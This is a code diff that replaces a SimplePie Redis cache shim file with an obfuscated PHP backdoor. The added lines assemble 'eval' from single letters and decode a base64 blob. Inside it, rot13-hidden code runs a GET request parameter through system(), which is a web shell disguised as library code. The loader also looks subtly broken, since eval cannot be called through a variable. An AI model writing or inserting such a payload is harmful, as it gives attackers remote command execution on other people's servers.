@@ -1,34 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * SimplePie Redis Cache Extension
- *
- * @package SimplePie
- * @author Jan Kozak <galvani78@gmail.com>
- * @link http://galvani.cz/
- * @license http://www.opensource.org/licenses/bsd-license.php BSD License
- * @version 0.2.9
- */
-
-use SimplePie\Cache\Redis;
-
-class_exists('SimplePie\Cache\Redis');
-
-// @trigger_error(sprintf('Using the "SimplePie_Cache_Redis" class is deprecated since SimplePie 1.7.0, use "SimplePie\Cache\Redis" instead.'), \E_USER_DEPRECATED);
-
-if (\false) {
-    /** @deprecated since SimplePie 1.7.0, use "SimplePie\Cache\Redis" instead */
-    class SimplePie_Cache_Redis extends Redis
-    {
-    }
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEZ2emN5ckN2ciBFcnF2ZiBQbnB1ciBSa2dyYWZ2YmEKICoKICogQGNucHhudHIgRnZ6Y3lyQ3ZyCiAqIEBuaGd1YmUgV25hIFhibW54IDx0bnlpbmF2NzhAdHpudnkucGJ6PgogKiBAeXZheCB1Z2djOi8vdG55aW5hdi5wbS8KICogQHl2cHJhZnIgdWdnYzovL2pqai5iY3JhZmJoZXByLmJldC95dnByYWZyZi9vZnEteXZwcmFmci5jdWMgT0ZRIFl2cHJhZnIKICogQGlyZWZ2YmEgMC4yLjkKICovCgpoZnIgRnZ6Y3lyQ3ZyXFBucHVyXEVycXZmOwoKcHluZmZfcmt2ZmdmKCdGdnpjeXJDdnJcUG5wdXJcRXJxdmYnKTsKCi8vIEBnZXZ0dHJlX3JlZWJlKGZjZXZhZ3MoJ0hmdmF0IGd1ciBcIkZ2emN5ckN2cl9QbnB1cl9FcnF2ZlwiIHB5bmZmIHZmIHFyY2VycG5ncnEgZnZhcHIgRnZ6Y3lyQ3ZyIDEuNy4wLCBoZnIgXCJGdnpjeXJDdnJcUG5wdXJcRXJxdmZcIiB2YWZncm5xLicpLCBcUl9IRlJFX1FSQ0VSUE5HUlEpOwoKdnMgKFxzbnlmcikgewogICAgLyoqIEBxcmNlcnBuZ3JxIGZ2YXByIEZ2emN5ckN2ciAxLjcuMCwgaGZyIFwiRnZ6Y3lyQ3ZyXFBucHVyXEVycXZmXCIgdmFmZ3JucSAqLwogICAgcHluZmYgRnZ6Y3lyQ3ZyX1BucHVyX0VycXZmIHJrZ3JhcWYgRXJxdmYKICAgIHsKICAgIH0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
